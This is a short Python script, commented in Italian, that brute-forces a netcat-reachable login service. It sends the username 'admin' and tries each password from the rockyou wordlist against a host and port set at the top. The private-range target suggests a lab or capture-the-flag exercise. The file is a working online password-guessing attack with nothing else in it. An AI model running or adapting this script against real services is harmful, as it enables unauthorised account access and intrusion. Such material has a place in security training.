import subprocess
import time

# CHANGE THEESE
host = "10.10.113.246"
port = 8000           
username = "admin"     
wordlist = "/usr/share/wordlists/rockyou.txt"  

def bruteforce(host, port, username, wordlist):
    # Apri il file della wordlist
    with open(wordlist, 'r', encoding='latin-1') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        try:
            # Apri la connessione netcat con subprocess
            proc = subprocess.Popen(
                ['nc', host, str(port)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Invia l'username "admin"
            proc.stdin.write(f"{username}\n")
            proc.stdin.flush()
            time.sleep(0.5)
            
            # Flag per determinare se bisogna ricominciare
            restart = False

            # Ciclo per inviare tre password
            for _ in range(3):
                # Leggi la risposta
                response = proc.stdout.readline().strip()
                print(f"Server: {response}")

                if "Password:" in response:
                    # Invia la password corrente
                    print(f"Invio password: {password}")
                    proc.stdin.write(f"{password}\n")
                    proc.stdin.flush()
                    time.sleep(0.5)

                    # Leggi la risposta
                    response = proc.stdout.readline().strip()
                    print(f"Server: {response}")

                    if "Password:" in response:
                        print("Password sbagliata, ricomincio con la prossima password.")
                        restart = True
                        break
                else:
                    # Se la risposta non contiene "Password:", abbiamo trovato la password
                    print(f"[+] Password corretta trovata: {password}")
                    proc.terminate()
                    return True

            if restart:
                # Se dobbiamo ricominciare, interrompi la connessione e passa alla prossima password
                proc.terminate()
                continue

            # Dopo aver inserito tre password, leggi la richiesta per l'username
            response = proc.stdout.readline().strip()
            print(f"Server: {response}")

            # Invia di nuovo "admin"
            print("Reinserisco l'username...")
            proc.stdin.write(f"{username}\n")
            proc.stdin.flush()
            time.sleep(0.5)

            # Chiudi il processo e passa alla prossima password
            proc.terminate()

        except Exception as e:
            print(f"Errore: {e}")
            proc.terminate()
            continue

    print("[-] Nessuna password valida trovata.")
    return False



# Esegui il bruteforce
bruteforce(host, port, username, wordlist)
